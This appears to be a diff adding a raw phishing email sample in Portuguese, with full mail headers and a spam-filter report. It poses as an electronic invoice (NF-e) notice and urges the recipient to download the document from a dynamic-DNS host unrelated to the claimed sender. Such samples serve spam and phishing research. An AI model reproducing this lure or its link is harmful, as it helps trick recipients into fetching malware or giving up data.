@@ -1,0 +1,131 @@
+Return-Path: <root@mail02.petrolifica-brasil.com>
+Delivered-To: contato@ipbtoledo.com.br
+Received: from server.mundotk.com.br
+	by server.mundotk.com.br with LMTP
+	id EHSoD58zSWFlfQAA85qOww
+	(envelope-from <root@mail02.petrolifica-brasil.com>)
+	for <contato@ipbtoledo.com.br>; Mon, 20 Sep 2021 22:21:35 -0300
+Return-path: <root@mail02.petrolifica-brasil.com>
+Envelope-to: contato@ipbtoledo.com.br
+Delivery-date: Mon, 20 Sep 2021 22:21:35 -0300
+Received: from mail02.petrolifica-brasil.com ([92.223.105.165]:48378)
+	by server.mundotk.com.br with esmtp (Exim 4.94.2)
+	(envelope-from <root@mail02.petrolifica-brasil.com>)
+	id 1mSUTR-00006d-HZ
+	for contato@ipbtoledo.com.br; Mon, 20 Sep 2021 22:21:35 -0300
+Received: by mail02.petrolifica-brasil.com (Postfix, from userid 0)
+	id B3E6A218CA; Tue, 21 Sep 2021 01:05:49 +0000 (UTC)
+content-type: text/html
+Subject: nota fiscal eletronica
+From: nfe@petrolifica-brasil.com
+To: contato@ipbtoledo.com.br
+Message-Id: <20210921010549.B3E6A218CA@mail02.petrolifica-brasil.com>
+Date: Tue, 21 Sep 2021 01:05:49 +0000 (UTC)
+X-Spam-Status: No, score=1.2
+X-Spam-Score: 12
+X-Spam-Bar: +
+X-Ham-Report: Spam detection software, running on the system "server.mundotk.com.br",
+ has NOT identified this incoming email as spam.  The original
+ message has been attached to this so you can view it or label
+ similar future email.  If you have any questions, see
+ root\@localhost for details.
+ Content preview:  nfe5 Olá, cliente! (a), Emissão de NF-e Nota Fiscal Eletronica
+    
+ Content analysis details:   (1.2 points, 5.0 required)
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+  0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
+                             blocked.  See
+                             http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
+                              for more information.
+                             [URIs: homelinux.com]
+  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+  1.0 KAM_LAZY_DOMAIN_SECURITY Sending domain does not have any
+                             anti-forgery methods
+  0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required
+                             MIME headers
+X-Spam-Flag: NO
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+
+<html>
+
+<head>
+
+
+
+  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">
+
+  <title>nfe5</title>
+
+
+
+
+
+</head>
+
+<body>
+
+
+
+<p style="margin-top: 0px; color: rgb(44, 54, 58); font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);"><br>
+
+</p>
+
+
+
+<p style="margin-top: 0px; color: rgb(44, 54, 58); font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">Ol&aacute;,
+
+cliente!<span style="font-weight: bold;">&nbsp;</span>(a),&nbsp;</p>
+
+<p style="margin-top: 0px; color: rgb(44, 54, 58); font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">Emiss&atilde;o
+
+de NF-e Nota Fiscal Eletronica<br style="">
+
+
+
+<br style="">
+
+
+
+Prezado(a) Foi emitida uma NF-e (Nota Fiscal Eletronica) referente ao
+
+seu pedido<br style="">
+
+
+
+n&ordm; {717630299842}</p>
+
+
+
+<p style="margin-top: 0px; color: rgb(44, 54, 58); font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">&nbsp;</p>
+
+
+
+<div style="text-align: center;"><a href="http://nfe.homelinux.com" target="_blank" rel="noreferrer" style="color: rgb(0, 172, 255); text-decoration: none; background-color: rgb(255, 255, 255); font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px;">Download
+
+NF-e Documento&nbsp;</a></div>
+
+
+
+<p style="margin-top: 0px; color: rgb(44, 54, 58); font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">&nbsp;</p>
+
+
+
+<p style="margin-top: 0px; color: rgb(44, 54, 58); font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">Gerado
+
+HOJE As 06:03 (AM) Horas.</p>
+
+
+
+<p style="margin-top: 0px; color: rgb(44, 54, 58); font-family: Roboto,sans-serif; font-size: 14px; font-style: normal; font-weight: 700; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; background-color: rgb(255, 255, 255);">&nbsp;</p>
+
+
+
+</body>
+
+</html>
+
+
